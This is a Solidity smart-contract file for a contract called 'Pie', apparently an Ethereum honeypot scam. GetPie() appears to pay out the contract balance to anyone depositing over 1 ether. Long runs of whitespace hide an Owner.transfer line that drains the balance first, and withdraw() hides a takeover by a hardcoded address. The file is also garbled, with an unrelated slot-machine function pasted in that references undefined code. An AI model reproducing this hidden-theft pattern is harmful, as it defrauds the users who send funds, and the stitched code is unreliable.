 

pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = msg.sender;
   

    function _finishSpin(address target)
        private returns (uint)
    {
        playerSpin memory spin = playerSpins[target];

        require(spin.tokenValue > 0); // No re-entrancy
        require(spin.blockn != block.number);

        uint profit = 0;
        uint category = 0;

        // If the block is more than 255 blocks old, we can't get the result
        // Also, if the result has already happened, fail as well
        uint result;
        if (block.number - spin.blockn > 255) {
          result = 1000000; // Can't win: default to largest number
        } else {

          // Generate a result - random based ONLY on a past block (future when submitted).
          // Case statement barrier numbers defined by the current payment schema at the top of the contract.
          result = random(1000000, spin.blockn, target) + 1;
        }

        if (result > 476662) {
            // Player has lost. Womp womp.

            // Add one percent of player loss to the jackpot
            // (do this by requesting a payout to the jackpot)
            RequestBankrollPayment(zlotsJackpot, profit, tier);

            // Null out player spin
            playerSpins[target] = playerSpin(uint200(0), uint48(0), uint8(0));

            emit Loss(target, spin.blockn);
            emit LogResult(target, result, profit, spin.tokenValue, category, false);
        } else if (result < 2) {
            // Player has won the three-moon mega jackpot!
      
            // Get profit amount via jackpot
            profit = ZlotsJackpotHoldingContract(zlotsJackpot).getJackpot();
            category = 1;
    
            // Emit events
            emit ThreeMoonJackpot(target, spin.blockn);
            emit LogResult(target, result, profit, spin.tokenValue, category, true);

            // Grab the tier
            uint8 tier = spin.tier;

            // Null out spins
            playerSpins[target] = playerSpin(uint200(0), uint48(0), uint8(0));

            // Pay out the winner
            ZlotsJackpotHoldingContract(zlotsJackpot).payOutWinner(target);
        } else {
            if (result < 299) {
                // Player has won a two-moon prize!
                profit = SafeMath.mul(spin.tokenValue, 100);
                category = 2;
                emit TwoMoonPrize(target, spin.blockn);
            } else if (result < 3128) {
                // Player has won the Z T H prize!
                profit = SafeMath.mul(spin.tokenValue, 20);
                category = 3;
                emit ZTHPrize(target, spin.blockn);
            } else if (result < 5957) {
                // Player has won a three Z symbol prize!
                profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 75), 10);
                category = 4;
                emit ThreeZSymbols(target, spin.blockn);
            } else if (result < 8786) {
                // Player has won a three T symbol prize!
                profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 75), 10);
                category = 5;
                emit ThreeTSymbols(target, spin.blockn);
            } else if (result < 11615) {
                // Player has won a three H symbol prize!
                profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 75), 10);
                category = 6;
                emit ThreeHSymbols(target, spin.blockn);
            } else if (result < 14444) {
                // Player has won a three Ether icon prize!
                profit = SafeMath.mul(spin.tokenValue, 15);
                category = 7;
                emit ThreeEtherIcons(target, spin.blockn);
            } else if (result < 17273) {
                // Player has won a three purple pyramid prize!
                profit = SafeMath.mul(spin.tokenValue, 10);
                category = 8;
                emit ThreePurplePyramids(target, spin.blockn);
            } else if (result < 20102) {
                // Player has won a three gold pyramid prize!
                profit = SafeMath.mul(spin.tokenValue, 10);
                category = 9;
                emit ThreeGoldPyramids(target, spin.blockn);
            } else if (result < 22930) {
                // Player has won a three rocket prize!
                profit = SafeMath.mul(spin.tokenValue, 12);
                category = 10;
                emit ThreeRockets(target, spin.blockn);
            } else if (result < 52333) {
                // Player has won a one moon prize!
                profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 25),10);
                category = 11;
                emit OneMoonPrize(target, spin.blockn);
            } else if (result < 120226) {
                // Player has won a each-coloured-pyramid prize!
                profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 15),10);
                category = 12;
                emit OneOfEachPyramidPrize(target, spin.blockn);
            } else if (result < 171147) {
                // Player has won a two Z symbol prize!
                profit = spin.tokenValue;
                category = 13;
                 emit TwoZSymbols(target, spin.blockn);
            } else if (result < 222068) {
                // Player has won a two T symbol prize!
                profit = spin.tokenValue;
                category = 14;
                emit TwoTSymbols(target, spin.blockn);
            } else if (result < 272989) {
                // Player has won a two H symbol prize!
                profit = spin.tokenValue;
                category = 15;
                emit TwoHSymbols(target, spin.blockn);
            } else if (result < 323910) {
                // Player has won a two Ether icon prize!
                profit = SafeMath.mul(spin.tokenValue, 2);
                category = 16;
                emit TwoEtherIcons(target, spin.blockn);
            } else if (result < 374831) {
                // Player has won a two purple pyramid prize!
                profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 133),100);
                category = 17;
                emit TwoPurplePyramids(target, spin.blockn);
            } else if (result < 425752) {
                // Player has won a two gold pyramid prize!
                profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 133),100);
                category = 18;
                emit TwoGoldPyramids(target, spin.blockn);
            } else {
                // Player has won a two rocket prize!
                profit = SafeMath.mul(spin.tokenValue, 2);
                category = 19;
                emit TwoRockets(target, spin.blockn);
            }

            emit LogResult(target, result, profit, spin.tokenValue, category, true);
            tier = spin.tier;
            playerSpins[target] = playerSpin(uint200(0), uint48(0), uint8(0)); // Prevent Re-entrancy
            RequestBankrollPayment(target, profit, tier);
          }
            
        emit SpinConcluded(target, spin.blockn);
        return result;
    }   


    function()
    public
    payable
    {
        
    }
   
    function GetPie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}